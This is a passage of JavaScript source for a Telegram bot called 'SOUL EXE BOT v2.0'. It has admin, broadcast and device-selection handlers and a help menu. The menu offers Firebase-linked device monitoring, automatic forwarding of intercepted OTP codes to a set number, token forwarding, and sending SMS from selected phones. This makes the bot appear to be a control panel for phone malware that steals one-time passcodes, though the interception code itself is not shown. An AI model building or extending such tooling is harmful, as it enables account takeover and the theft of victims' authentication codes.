    user.banned = false;
    userData.set(targetId, user);
    
    await ctx.reply(`✅ User unbanned!`);
});

bot.command('broadcast', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!isAdmin(userId)) return ctx.reply('❌ Access Denied!');
    
    const args = ctx.message.text.split(' ');
    if (args.length < 2) return ctx.reply('Usage: `/broadcast <message>`');
    
    const message = args.slice(1).join(' ');
    const msg = await ctx.reply(`📢 Broadcasting...`);
    
    let success = 0;
    for (const [uid, user] of userData.entries()) {
        if (user.banned) continue;
        try {
            await bot.telegram.sendMessage(uid, `📢 *ANNOUNCEMENT*\n\n${message}`, { parse_mode: 'Markdown' });
            success++;
        } catch(e) {}
        await new Promise(r => setTimeout(r, 50));
    }
    
    await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null, `✅ Sent to ${success} users`);
});

bot.command('help', async (ctx) => {
    await ctx.reply(
        `⚡ *COMMANDS*\n\n` +
        `🔧 *SETUP:*\n` +
        `/setfirebase <url>\n` +
        `/setdevice\n` +
        `/addchannel\n` +
        `/startmonitor\n\n` +
        `🔐 *OTP FORWARD:*\n` +
        `/setotpnum <number>\n` +
        `/removeotpnum\n` +
        `/showotpnum\n\n` +
        `📌 *TOKEN FORWARD:*\n` +
        `Send: To: 919876543210\\nMessage: TOKEN\n\n` +
        `⚙️ *CONTROL:*\n` +
        `/stop / /resume\n` +
        `/status\n` +
        `/send <num> <msg>`,
        { parse_mode: 'Markdown' }
    );
});

bot.command('id', async (ctx) => {
    await ctx.reply(`🆔 Chat ID: \`${ctx.chat.id}\``, { parse_mode: 'Markdown' });
});

// ==================== CALLBACKS ====================
bot.action(/^select_dev_(.+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const deviceId = ctx.match[1];
    
    const device = await getDevice(userId, deviceId);
    if (!device) {
        await ctx.editMessageText('❌ Device not found');
        return;
    }
    
    const user = userData.get(userId);
    user.monitoringDevice = deviceId;
    user.deviceList = null;
    user.processedMsgs = new Set();
    userData.set(userId, user);
    
    await ctx.editMessageText(
        `✅ *Device Set!*\n\n` +
        `📱 Name: ${device.name}\n` +
        `🆔 ID: \`${device.id}\`\n` +
        `📞 Phone: ${device.phone}\n` +
        `🔋 Battery: ${device.battery}\n\n` +
        `Next: \`/addchannel\` or \`/setotpnum\``,
        { parse_mode: 'Markdown' }
    );
});

bot.action(/^dev_page_(\d+)$/, async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const page = parseInt(ctx.match[1]);
    await showDevicePage(ctx, userId, page);
});

bot.action('cancel_select', async (ctx) => {
    await ctx.answerCbQuery();
    const userId = ctx.from.id.toString();
    const user = userData.get(userId);
    if (user) user.deviceList = null;
    await ctx.editMessageText('❌ Cancelled.');
});

// ==================== START ====================
async function main() {
    console.log('\n🚀 ========== SOUL EXE BOT v2.0 ==========');
    console.log('✅ TOKEN FORWARD: To: X Message: Y');
    console.log('✅ OTP AUTO-FORWARD: /setotpnum');
    console.log('==========================================\n');
    
    bot.launch();
    console.log('🤖 Bot running...\n');
}

main();
